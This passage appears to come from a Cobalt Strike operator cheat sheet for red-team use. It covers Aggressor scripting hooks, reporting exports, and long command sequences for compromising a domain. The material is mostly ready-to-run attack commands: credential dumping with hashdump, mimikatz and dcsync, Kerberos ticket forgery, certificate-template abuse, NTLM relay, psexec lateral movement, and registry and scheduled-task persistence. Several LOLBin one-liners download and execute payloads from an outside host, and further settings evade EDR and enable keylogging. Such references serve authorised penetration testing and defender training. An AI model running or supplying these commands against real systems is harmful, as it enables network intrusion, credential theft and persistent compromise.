on beacon_input       { /* operator typed a command */ }
on event_join         { /* operator joined */ }
on event_quit         { /* operator disconnected */ }
on event_newsite      { /* new site created */ }
on heartbeat_5s       { /* every 5 seconds */ }
on heartbeat_1m       { /* every minute */ }
```

#### Right-click Menu Extensions

```coffeescript
popup beacon_top {
    item "My Custom Action" {
        local('$bid');
        foreach $bid ($1) {
            bshell($bid, "hostname");
        }
    }
}

popup targets {
    item "Scan This Host" {
        local('$target');
        $target = $1;
        # ... do something
    }
}
```

#### Useful Helper Functions

```coffeescript
beacon_info($bid, "os")            # get Beacon metadata: os, user, pid, etc.
beacon_host($bid)                  # target hostname
beacon_pid($bid)                   # Beacon PID
beacon_user($bid)                  # current user
beacon_isadmin($bid)               # is admin?
listener_names()                   # list of listeners
openX($path)                       # open a file
readb($handle, $n)                 # read bytes
strlen($str)                       # string length
split(" ", $str)                   # split string
join(", ", @array)                 # join array
uc($str)                           # uppercase
lc($str)                           # lowercase
matches($str, $regex)              # regex match
gunzip($data)                      # decompress
```

### Popular Community Scripts (Aggressor)

| Script | Purpose |
|---|---|
| `CobaltStrike-BOF` | BOF collection |
| `Arsenal Kit` | Artifact + Payload generation |
| `Elevate Kit` | Additional UAC bypasses |
| `UDRL` | User-defined reflective loader |
| `Situational Awareness BOF` | Environment recon (without cmd/ps) |
| `nanodump` | LSASS dump BOF |
| `EDRSandblast` | EDR bypass via UEFI/FltMgr |

---

## 19. Reporting & Data Export

### Built-in Reports

```
Reporting menu → Activity Report
                  Hosts Report
                  Indicators of Compromise
                  Sessions Report
                  Social Engineering Report
                  Tactics, Techniques & Procedures
```

### Exporting Data

```
View → Credentials     → export as .csv
View → Downloads       → sync to local disk
View → Keystrokes      → copy/export
View → Screenshots     → save to folder
View → Targets         → export as .csv
```

### Event Log

```
View → Event Log    # all operator actions and Beacon events
```

---

## 20. Advanced Techniques & Chaining

### Full Domain Compromise Chain Example

```
# Step 1: Initial access via phishing
# Victim runs payload → Beacon checks in

# Step 2: Situational awareness
beacon> sleep 0                              # interactive for recon
beacon> getuid                               # confirm user
beacon> ps                                  # find good inject target
beacon> net dclist                          # find DCs
beacon> net group "Domain Admins"           # who is DA?

# Step 3: Privilege escalation
beacon> getsystem                            # try SYSTEM
beacon> elevate uac-token-duplication lab-https  # get admin beacon

# Step 4: Dump credentials
beacon> hashdump                             # local SAM
beacon> logonpasswords                       # LSASS
beacon> dcsync corp.local CORP\krbtgt       # golden ticket material

# Step 5: Lateral movement
beacon> make_token CORP\administrator <password>
beacon> jump psexec dc01.corp.local lab-https

# Step 6: On DC
beacon> dcsync corp.local CORP\administrator
beacon> hashdump

# Step 7: Persistence
beacon> shell reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svc /t REG_SZ /d "C:\Temp\b.exe"
beacon> shell schtasks /create /tn "WindowsUpdate" /tr C:\Temp\b.exe /sc onlogon /ru SYSTEM
```

### Kerberos Attack Chain

```
# Kerberoast
beacon> execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt
# (Crack offline with hashcat -m 13100)

# AS-REP Roast
beacon> execute-assembly Rubeus.exe asreproast /format:hashcat

# Pass-the-Ticket
beacon> execute-assembly Rubeus.exe dump /service:krbtgt /nowrap
beacon> execute-assembly Rubeus.exe ptt /ticket:<base64>

# Golden Ticket (after dcsync for krbtgt hash)
beacon> mimikatz kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt

# Silver Ticket
beacon> mimikatz kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc /rc4:<machine_hash> /ptt
```

### ADCS (Active Directory Certificate Services) Abuse

```
# Find vulnerable certificate templates
beacon> execute-assembly Certify.exe find /vulnerable

# Request certificate for domain admin
beacon> execute-assembly Certify.exe request /ca:ca01.corp.local\corp-CA /template:VulnTemplate /altname:administrator

# Convert to PFX (on operator box)
# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Upload PFX and authenticate
beacon> upload cert.pfx
beacon> execute-assembly Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password123 /ptt
```

### Credential Relay (SMB NTLM)

```
# Capture NTLM challenge (Responder running on team server via rportfwd)
beacon> rportfwd 445 192.168.1.100 445   # forward SMB on target to our Responder
# Force auth:
beacon> shell net use \\127.0.0.1\share  # or coerce via printerbug/petitpotam
```

### Living Off the Land (LOLBins)

```
# rundll32 stager
beacon> shell rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(...)");

# certutil download
beacon> shell certutil.exe -urlcache -split -f http://192.168.1.100/b.exe C:\Temp\b.exe

# bitsadmin download
beacon> shell bitsadmin /transfer myJob http://192.168.1.100/b.exe C:\Temp\b.exe

# mshta execution
beacon> shell mshta.exe http://192.168.1.100/payload.hta

# regsvr32 COM scriptlet
beacon> shell regsvr32.exe /s /n /u /i:http://192.168.1.100/payload.sct scrobj.dll

# wscript
beacon> shell wscript.exe //e:jscript C:\Temp\payload.js
```

### Process Injection into Protected Processes

```
# PPL (Protected Process Light) — limited injection options
# Target: non-PPL processes in their session
beacon> ps                   # find target PID in correct session
beacon> inject <pid> x64 lab-https   # inject into non-PPL process
```

---

## 21. Quick Reference Cheat Sheet

### Recon

```
getuid | getpid | ps | net dclist | net computers | net group "Domain Admins"
shell systeminfo | shell ipconfig /all | shell netstat -ano | shell whoami /all
portscan 10.0.0.0/24 common arp 1024
```

### File Ops

```
ls | cd | pwd | mkdir | mv | cp | rm | download | upload | drives | timestomp
```

### Creds

```
hashdump | logonpasswords | dcsync <domain> <user>
mimikatz sekurlsa::logonpasswords
pth <domain\user> <hash>
execute-assembly Rubeus.exe kerberoast
execute-assembly Rubeus.exe asreproast
```

### Privesc

```
getsystem
elevate uac-token-duplication <listener>
elevate uac-schtasks <listener>
elevate juicy-potato <listener>  (Elevate Kit)
elevate printspoofer <listener>  (Elevate Kit)
elevate sweetpotato <listener>   (Elevate Kit)
```

### Lateral Movement

```
make_token <domain\user> <password>
steal_token <pid>
jump psexec <host> <listener>
jump psexec64 <host> <listener>
jump psexec_psh <host> <listener>
jump winrm64 <host> <listener>
jump wmi <host> <listener>
remote-exec psexec <host> <cmd>
```

### Injection / Execution

```
inject <pid> <arch> <listener>
shinject <pid> <arch> <shellcode.bin>
dllinject <pid> <dll>
execute-assembly <asm.exe> [args]
powerpick <expression>
inline-execute <bof.o> [args]
```

### OPSEC

```
sleep 60 30                          # 60s interval, 30% jitter
spawnto x64 C:\Windows\System32\dllhost.exe
ppid 4812                            # spoof parent PID
blockdlls start                      # block 3rd-party DLL injection
argue <binary> <fake_args>
```

### Pivoting

```
socks 1080
rportfwd <bind_port> <dst_host> <dst_port>
link <host> [pipe_name]
connect <host> <port>
```

### Keylogging / Screen

```
screenshot | screenwatch 1000 | keylogger | keylogger stop | clipboard | desktop
```

---

*Last updated: 2026-06-09 | Reference for authorized red team use only.*
